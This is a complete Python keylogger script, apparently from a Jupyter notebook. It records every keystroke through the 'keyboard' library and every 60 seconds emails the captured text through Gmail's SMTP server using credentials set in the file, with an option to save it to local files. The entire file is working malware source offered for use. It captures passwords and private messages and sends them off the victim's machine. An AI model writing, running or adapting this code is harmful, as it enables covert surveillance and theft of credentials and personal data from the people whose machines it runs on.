import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
from threading import Timer
from datetime import datetime
# In[ ]:
interval = 60 
email_add = "your-email-add"
email_pass = "email-password"

# In[ ]:

class Keylogger:
    def __init__(self, interval, method):
        self.interval = interval
        self.method = method
        self.log = ""
        self.s_time = datetime.now()
        self.e_time = datetime.now()
        
    def Activity(self, event):
        """This function is called when a keyboard event occurs"""
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
        self.log += name
        
    def get_new_filename(self):
        s_time_str = str(self.s_time)[:-7].replace(" ", "-").replace(":", "")
        e_time_str = str(self.e_time)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{s_time_str}_{e_time_str}"

    def save_log_to_file(self):
        """this function saves the keyboard logs in a text file in the current directory"""
        with open(f"{self.filename}.txt", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    def sendmail(self, email, password, message):
        """ this function sends the logs over email """
        server = smtplib.SMTP(host="smtp.gmail.com", port=587) # connection to the SMTP server
        server.starttls()# connect to SMTP server as TLS mode ( for security )
        server.login(email, password)# login to the email account
        server.sendmail(email, email, message)# send the actual message
        print("sent_mail")
        server.quit()# terminates the session
        
    def save_log(self):
        """
        function to save the logs after every interval seconds and also reset the log to store the logs for next interval
        """
        if self.log!="":
            self.e_time = datetime.now()
            # update `self.filename`
            self.get_new_filename()
            if self.method == "email":
                self.sendmail(email_add, email_pass, self.log)
            elif self.method == "file":
                self.save_log_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.s_time = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.save_log)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
    def start(self):
        # record the start datetime
        self.s_time = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.Activity)
        # start save_loging the keylogs
        self.save_log()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()


# In[ ]:


if __name__ == "__main__":
    # for email
    keylogger = Keylogger(interval=interval, method="email")
    # for file
    #keylogger = Keylogger(interval=interval, method="file")
    keylogger.start()


# In[ ]:




